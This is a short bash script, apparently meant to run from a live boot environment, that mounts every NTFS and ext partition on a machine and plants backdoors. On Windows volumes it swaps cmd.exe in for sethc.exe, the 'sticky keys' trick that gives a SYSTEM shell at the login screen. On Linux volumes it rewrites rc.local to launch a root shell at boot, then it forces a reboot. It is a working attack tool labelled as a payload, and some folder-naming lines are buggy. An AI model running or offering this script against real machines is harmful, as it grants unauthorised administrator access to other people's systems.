#!/bin/bash
# This script is written by Michael Bailey
# It is covered under the Beerware license
mkdir /mountpoint
ntfsparts=($(blkid | grep "ntfs" | cut -d: -f1))
for i in "${ntfsparts[@]}"
do
	foldername=$(echo a$ntfsparts | sed 's/\///g')
	mkdir /mountpoint/$foldername
	mount $i /mountpoint/$foldername
done
echo Payload time lol
sethcpath=$(find /mountpoint -name sethc.exe | grep -i WINDOWS/system32/sethc.exe$)
nosethc=$(echo $sethcpath | sed 's/\/sethc.exe//g')
mv $sethcpath $sethcpath.$RANDOM
cp $nosethc/cmd.exe $nosethc/sethc.exe
# First part of Linux
extparts=($(blkid | grep "ext" | cut -d: -f1))
for i in "${extparts[@]}"
do
        foldername2=$(echo b$extparts | sed 's/\///g')
        mkdir /mountpoint/$foldername2
        mount $i /mountpoint/$foldername2
	rcloc=$(find /mountpoint/$foldername2 -name rc.local)
	if [ -a /usr/bin/bash ] || [ -a /bin/bash ] || [ -a /usr/sbin/bash ]; then
		sed -i 's/exit 0/\/bin\/bash/g' $rcloc
	else
                sed -i 's/exit 0/\/bin\/sh/g' $rcloc
	fi
	echo exit 0 >> $rcloc
done




# unmount everything
umount /mountpoint/*
# go ahead and shut down
shutdown -r now
reboot
halt
